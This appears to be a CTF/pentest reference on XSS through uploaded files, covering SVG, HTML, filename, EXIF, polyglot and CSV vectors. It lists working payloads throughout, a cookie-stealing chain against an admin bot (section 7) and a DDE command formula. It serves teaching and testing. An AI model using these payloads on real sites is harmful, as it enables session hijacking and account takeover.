# Upload XSS — XSS delivered through uploaded files

The stored-XSS sibling: the payload isn't a form field, it's a file
the app stores and later serves to a victim (admin bot, moderator).

---

## 1. The file types that execute as HTML

| Type | Payload |
|---|---|
| `.html`/`.htm` | full HTML — runs when served with text/html |
| `.svg` | `<svg onload=alert(1)>` — executes when rendered directly |
| `.xml` | XML + XSLT or embedded xhtml |
| `.xhtml` | xhtml — same as html |
| `.swf` | Flash — legacy but still parses |
| `.pdf` | PDF JS (`app.alert`) — needs Acrobat-JS, rare in Chrome |
| `.md` | markdown → if rendered with raw-HTML pass |
| `.txt` | served as text/plain — dead unless content-sniffed |

The gate: the upload endpoint's `Content-Type` when it serves the
file back. `.svg` served as `image/svg+xml` EXECUTES when opened
directly (and via `<embed>`/`<object>`/`<iframe>` — NOT via `<img>`).

---

## 2. SVG — the highest-value upload type

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[alert(1)]]></script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <a href="javascript:alert(1)"><text x=0 y=20>x</text></a>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert(1)"/>
  <animate attributeName="onload" to="alert(1)"/>   -- wrong —
     animate can't set event attrs; use set or plain onload
</svg>

<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a>
</svg>
```

The `<img src=x.svg>` DOES NOT run the script — SVG-loaded-as-image
has scripting disabled. The exfil path:

```html
<!-- the victim page must LOAD the svg as a document, not an image: -->
<iframe src="/uploads/x.svg"></iframe>          -- script runs
<object data="/uploads/x.svg"></object>         -- script runs
<embed src="/uploads/x.svg">                    -- script runs
<a href="/uploads/x.svg">click</a>              -- direct-nav runs
<!-- <img src="/uploads/x.svg"> -- dead for XSS -->
```

---

## 3. Content-Type mismatches — the sniffing paths

```text
file.svg served as image/svg+xml        → direct-nav + embed run
file.svg served as text/plain            → dead (no parse)
file.svg served as application/octet-stream → download (dead)
file.html served as text/html            → direct-nav runs
file.html served as text/plain           → dead
file.html + X-Content-Type-Options:nosniff → honored type only
file.xxx with no type                    → SNIFFED — html/svg detected
```

`X-Content-Type-Options: nosniff` forces the declared type —
without it, the browser sniffs and a `.txt` containing HTML can
parse as HTML.

The polyglot trick: a file that's BOTH a valid image AND HTML —
a `.gif` whose content is `<svg onload=alert(1)>` won't work, but
a file starting with GIF89a bytes + html after CAN sniff as HTML
in some cases. `archive_gen`/`upload_probe` cover polyglot-builders.

---

## 4. Filename as the vector — the name IS the injection

```html
filename: x"><img src=x onerror=alert(1)>.png
   → the filename renders in the file-listing HTML unescaped:
   <a href="/uploads/x"><img src=x onerror=alert(1)>.png">x...</a>
   → classic stored XSS — the filename field is the injection point
```

The filename lands in: directory listings, "uploaded file" UI,
download `Content-Disposition` headers, JSON metadata responses.

```text
Content-Disposition: attachment; filename="x"><img...>.png"
   → browsers don't parse headers as HTML — dead
   → but the response-HEADER filename can hit a listing page
```

---

## 5. The upload-path pivot — XSS → other vulns

```text
upload + no type check          → .html/.svg upload → stored XSS
upload + type check             → .svg as image/svg+xml → still XSS
upload + whitelist png/jpg      → filename XSS or content-sniff
upload + file:// access         → LFI/side-channel via upload
upload + path traversal         → write .html into a served dir
upload + archive (zip/tar)      → traversal-extract → .html lands
```

The filename-traversal sibling: `../../templates/x.html` as the
filename writes to a template dir — now your HTML runs in the app's
template context (may be CSP-protected differently).

---

## 6. The `upload_probe` tool — the repo's check

```bash
python3 tools/web/upload_probe.py \
   --url https://target/upload \
   --field file \
   --selftest
   -- name the field, the tool probes ext/MIME/polyglot variants
```

Check `--help` for the real flags — the tool sweeps the upload
endpoints for accepted types, polyglot-survival, and filename-
reflexion. Use its output to pick the file type + payload family.

---

## 7. The stored-in-listing XSS — the common CTF shape

```text
1. upload a file named: x"><img src=x onerror=alert(document.cookie)>
2. the listing page shows it unescaped → fires for ANY viewer
3. admin bot visits the listing → your JS runs in their session
4. exfil via any exfil-methods.md channel
```

The canonical chain — filename-field XSS is the #1 upload-adjacent
CTF find because devs sanitize the file CONTENT but not the name.

---

## 8. When only .png/.jpg/.gif is allowed — the content-vector dead end

If the server only accepts image files AND serves them with a
correct image type AND nosniff — the content can't carry XSS.
Remaining paths:

```text
- filename XSS (still works — name not content)
- EXIF metadata XSS (rare — exif renders as text usually)
- polyglot .gif+html (needs sniff-enabled + missing nosniff)
- the upload endpoint itself reflects the filename unescaped
- a different upload field with looser checks
```

`exiftool x.gif -Comment='<img src=x onerror=alert(1)>'` — EXIF
comment as a metadata-carrier (only fires if the app renders EXIF
unsanitized — rare).

---

## 9. PDF uploads — the modern limits

```javascript
// a PDF can contain JS but modern browsers don't run it:
// Chrome/Firefox PDF viewers: no app.alert, no submitForm
// Adobe Acrobat: runs it — irrelevant for web-victim flows
```

PDF-XSS only matters when the app converts/renders the PDF
server-side (wkhtmltopdf, pdf-lib in a renderer) — then the PDF's
embedded JS can run in the RENDERER's context. `web-deserialization`
and the renderer-sink paths cover it.

---

## 10. The `.xlsx`/`.csv` variant — sheet-name and formula fields

```csv
=cmd|'/c calc'!A1                -- DDE formula — Excel-side, not web
```

CSV formula-injection affects EXCEL when the victim opens the file —
not a web XSS. For web rendering of uploaded CSVs, the cell VALUES
could carry HTML if the renderer doesn't escape — test with
`<img src=x onerror=alert(1)>` as a cell value.
